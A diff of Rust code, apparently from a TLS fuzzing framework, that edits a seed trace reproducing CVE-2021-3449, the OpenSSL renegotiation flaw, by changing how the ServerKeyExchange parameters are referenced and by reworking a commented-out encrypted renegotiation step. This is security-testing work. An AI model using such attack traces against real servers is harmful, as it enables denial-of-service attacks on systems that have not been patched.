@@ -331,7 +331,7 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TlsQueryMatcher> {
                     (@renegotiation_client_hello),
                     ((server, 0)),
                     (fn_decode_ecdh_pubkey(
-                        ((server, 2)/Vec<u8>) // ServerECDHParams
+                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                     )),
                     fn_named_group_secp384r1,
                     fn_true,
@@ -341,15 +341,15 @@ pub fn seed_cve_2021_3449(server: AgentName) -> Trace<TlsQueryMatcher> {
         }),
     });
 
-    /*    trace.stepSignature::push(Step {
+    /*trace.steps.push(Step {
         agent: server,
         action: Action::Input(InputAction {
             recipe: term! {
                 fn_encrypt12(
-                    fn_alert_close_notify,
+                    renegotiation_client_hello,
                     ((server, 0)),
-                    (fn_decode_ecdh_params(
-                        ((server, 2)/Vec<u8>) // ServerECDHParams
+                    (fn_decode_ecdh_pubkey(
+                        ((server, 0)[Some(TlsQueryMatcher::Handshake(Some(HandshakeType::ServerKeyExchange)))]/Vec<u8>) // ServerECDHParams
                     )),
                     fn_named_group_secp384r1,
                     fn_true,
